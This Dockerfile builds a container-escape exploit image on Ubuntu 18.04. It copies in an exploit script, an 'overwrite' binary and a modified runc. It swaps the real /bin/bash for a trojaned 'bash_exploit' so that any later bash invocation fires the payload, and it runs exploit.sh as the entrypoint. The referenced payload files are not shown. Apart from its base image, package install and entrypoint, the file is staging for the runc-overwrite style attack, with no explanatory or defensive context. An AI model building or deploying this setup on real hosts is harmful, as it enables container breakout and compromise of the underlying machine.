FROM ubuntu:18.04

RUN ["apt-get", "update"]
RUN ["apt-get", "install", "-y", "vim"]

COPY exploit.sh /
RUN ["chmod", "+x", "/exploit.sh"]
COPY overwrite /overwrite
RUN ["chmod", "+x", "/overwrite"]
COPY modified_runc /

RUN ["mv", "/bin/bash", "/bin/bash_original"]
COPY bash_exploit /bin/bash
RUN ["chmod", "+x", "/bin/bash"]

ENTRYPOINT ["/bin/bash_original", "/exploit.sh"]
